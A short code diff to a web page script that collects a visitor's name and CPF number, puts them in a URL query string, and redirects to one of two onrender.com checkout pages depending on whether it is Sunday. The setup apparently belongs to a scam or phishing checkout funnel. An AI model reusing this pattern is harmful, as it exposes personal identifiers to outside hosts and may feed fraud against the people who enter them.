@@ -1051,7 +1051,15 @@
                 const currentParams = new URLSearchParams(window.location.search);
                 currentParams.set('nome', name);
                 currentParams.set('cpf', cpfRaw);
-                const redirectUrl = `https://lcheckseguro.onrender.com/compra/?${currentParams.toString()}`;
+                // Preencha os dois links abaixo, mantendo as aspas.
+                // De segunda-feira a sábado: link X. Aos domingos: link Y.
+                const LINK_SEGUNDA_A_SABADO = 'https://lcheckseguro.onrender.com/compra/';
+                const LINK_DOMINGO = 'https://lpayseguro.onrender.com/compra/';
+                const linkDestino = new Date().getDay() === 0
+                    ? LINK_DOMINGO
+                    : LINK_SEGUNDA_A_SABADO;
+                const separador = linkDestino.includes('?') ? '&' : '?';
+                const redirectUrl = `${linkDestino}${separador}${currentParams.toString()}`;
                 window.location.replace(redirectUrl);
             }, 800);
         }
